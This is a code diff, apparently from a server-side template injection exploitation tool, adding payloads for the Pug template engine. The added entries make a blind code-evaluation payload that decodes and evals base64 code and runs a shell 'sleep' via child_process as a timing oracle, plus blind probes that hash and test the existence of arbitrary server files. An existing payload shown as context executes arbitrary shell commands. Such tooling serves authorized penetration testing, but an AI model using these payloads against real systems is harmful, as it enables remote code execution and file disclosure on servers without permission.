@@ -42,6 +42,10 @@ class Pug(javascript.Javascript):
                 'call': 'inject',
                 'evaluate_blind': """0\n- x = [""]\n- x[0+!eval(Buffer('{code_b64p}', 'base64').toString())]["length"]\n"""
             },
+            'evaluate_blind': {
+                'call': 'inject',
+                'evaluate_blind': """0\n- eval(Buffer('{code_b64p}', 'base64').toString())&&global.process.mainModule.require('child_process').execSync('sleep {delay}')\n"""
+            },
             'execute': {
                 'call': 'render',
                 'execute': """= global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
@@ -84,6 +88,11 @@ class Pug(javascript.Javascript):
             },
             'md5_error': {
                 'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
+            },
+            'md5_blind': {
+                'call': 'evaluate_blind',
+                'md5_blind': "global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest('hex')=='{md5}'",
+                'exists_blind': "global.process.mainModule.require('fs').existsSync('{path}')"
             },
         })
 
